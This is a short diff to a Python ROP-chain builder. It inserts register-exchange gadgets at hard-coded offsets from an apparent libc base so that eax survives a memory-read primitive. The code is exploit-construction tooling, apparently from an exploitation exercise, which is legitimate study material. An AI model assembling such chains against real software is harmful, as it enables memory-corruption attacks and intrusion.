@@ -134,7 +134,8 @@ class ROP:
         '''
         1. xchg eax, edi                                        #edi will preserve state from eax
         2. 0x0006a227 : mov eax, dword ptr [edx] ; ret          #eax has value read in
-        3. pop ecx
+        2.5: xchg eax, esi                          #to preserve eax
+        3. pop ecx                                  #this will trash eax
         4. self.arr += 0x000000FF
         5. 0x0002d87e : and eax, ecx ; ret          #eax has lower byte read in from mem
         6. xchg eax, ebx                            #ebx has lower byte read in from mem, eax is trashed
@@ -148,8 +149,10 @@ class ROP:
 
         self.xchg_w_eax("edi")
         self.arr += (0x0006a227 + 0xb7dec000).to_bytes(4, byteorder='little')
+        self.xchg_w_eax("esi")
         self.pop_register("ecx")
         self.arr += (0x000000FF).to_bytes(4, byteorder='little')
+        self.xchg_w_eax("esi")
         self.arr += (0x0002d87e + 0xb7dec000).to_bytes(4, byteorder='little')
         self.xchg_w_eax("ebx")
         self.swp_regs("edi", "ecx")
